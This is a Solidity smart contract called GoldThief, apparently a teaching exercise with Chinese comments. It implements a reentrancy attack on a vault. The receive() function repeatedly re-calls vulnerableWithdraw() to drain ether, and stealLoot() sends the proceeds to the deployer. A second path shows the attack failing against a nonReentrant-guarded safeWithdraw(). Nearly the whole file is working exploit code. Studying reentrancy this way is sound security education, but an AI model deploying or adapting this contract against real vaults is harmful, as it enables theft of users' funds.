// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {//在 GoldThief 合约能与金库交互之前，它需要知道有哪些函数可用
function deposit() external payable;//存钱
function vulnerableWithdraw() external;//没有防止攻击的提现
function safeWithdraw() external;
}

contract GoldThief {
IVault public targetVault;//targetVault是我们要攻击的金库地址，用 IVault 接口包装
address public owner;//存储部署攻击合约的地址——“主谋”
uint public attackCount;//记录我们重入循环的次数
bool public attackingSafe;//这个标志记录我们当前攻击的是哪一个版本的金库：attackingSafe 为 false，我们在攻击 vulnerableWithdraw()

constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);//把传入的地址 _vaultAddress 转成 IVault 类型并存入 targetVault
    owner = msg.sender;
}

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.vulnerableWithdraw();
}

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();
}

receive() external payable {
    attackCount++;

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail due to nonReentrant
    }
}

function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}